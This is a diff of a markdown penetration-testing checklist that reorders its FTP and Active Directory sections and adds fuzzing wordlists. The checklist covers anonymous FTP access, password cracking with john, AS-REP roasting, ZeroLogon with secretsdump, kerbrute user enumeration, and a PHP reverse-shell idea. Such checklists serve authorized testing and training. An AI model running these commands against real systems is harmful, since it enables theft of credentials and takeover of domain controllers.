@@ -10,6 +10,52 @@ _The following sequence should be followed accordingly if applicable to conduct 
 rscan $ip
 ```
 
+### FTP Testing
+
+#### Anonymous Access
+
+Check for anonymous login guest, ftp, anonymous, anonymous@anonymous.com
+
+```
+ftp $ip
+```
+
+#### File Download
+
+Type "passive" if needed to remove passive mode to be able to continue to access ftp. type "binary" first then get to download files
+
+```
+ftp> passive
+ftp> binary
+```
+
+Rescursively download files via ftp
+
+```
+wget -r ftp://user:pass@ip/
+```
+
+If you find password-protected zip files use zip2john followed by john the hash\*
+
+```
+zip2john file.zip >> hashes.txt
+john hashes.txt
+```
+
+#### Test For File Upload RCE
+
+If ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.
+
+#### ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution
+
+#### Meta Data
+
+Extract meta data and may contain email addresses\*
+
+```
+exiftool file
+```
+
 ### RPC Testing
 
 #### Test For PrintNightmare
@@ -133,50 +179,38 @@ smbclient //$ip/someshare -U 'guest' -N
 smbclient //$ip/someshare -U 'validuser' -p 'validpass'
 ```
 
-### FTP Testing
+### Active Directory Testing (No Creds)
 
-#### Anonymous Access
-
-Check for anonymous login guest, ftp, anonymous, anonymous@anonymous.com
+#### Test for information disclosure
 
 ```
-ftp $ip
+ldapenum -d $domain
 ```
 
-#### File Download
-
-Type "passive" if needed to remove passive mode to be able to continue to access ftp. type "binary" first then get to download files
-
 ```
-ftp> passive
-ftp> binary
+ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
 ```
 
-Rescursively download files via ftp
+#### Test for UF DONT REQUIRE PREAUTH
 
 ```
-wget -r ftp://user:pass@ip/
+GetNPUsers.py $domain/ -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -dc-ip $ip
 ```
 
-If you find password-protected zip files use zip2john followed by john the hash\*
+#### Test for zeroLogon
 
 ```
-zip2john file.zip >> hashes.txt
-john hashes.txt
+python3 /opt/set_empty_pw.py dc-name $ip
 ```
 
-#### Test For File Upload RCE
+```
+secretsdump.py -just-dc $domain/dc-name\$@$ip
+```
 
-If ftp allows uploading of files and the webserver has an local file inclusion vulnerability you can upload a php shell and call the file from the webserver to gain a reverse shell maybe it’ll have functionality that auto-executes uploaded files periodically.
-
-#### ProFTPd 1.3.5 - 'mod\_copy' Remote Command Execution
-
-#### Meta Data
-
-Extract meta data and may contain email addresses\*
+#### Enumerate Users
 
 ```
-exiftool file
+kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
 ```
 
 ### Web Application Testing
@@ -215,10 +249,18 @@ Directories
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://$ip/FUZZ/ -fc 404
 ```
 
+```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/FUZZ/ -fc 404
+```
+
 Files
 
 ```
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$ip/FUZZ -fc 404
+```
+
+```
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://$ip/FUZZ -fc 404
 ```
 
 Words
@@ -278,40 +320,6 @@ wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404
 #### XXE
 
 #### XSS
-
-### Active Directory Testing (No Creds)
-
-#### Test for zeroLogon
-
-```
-python3 /opt/set_empty_pw.py dc-name $ip
-```
-
-```
-secretsdump.py -just-dc $domain/dc-name\$@$ip
-```
-
-#### Test for information disclosure
-
-```
-ldapenum -d $domain
-```
-
-```
-ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" "(objectclass=*)"
-```
-
-#### Test for UF DONT REQUIRE PREAUTH
-
-```
-GetNPUsers.py $domain/ -no-pass -usersfile users.txt -dc-ip $ip
-```
-
-#### Enumerate Users
-
-```
-kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
-```
 
 ## Windows Post-Foothold Testing
 
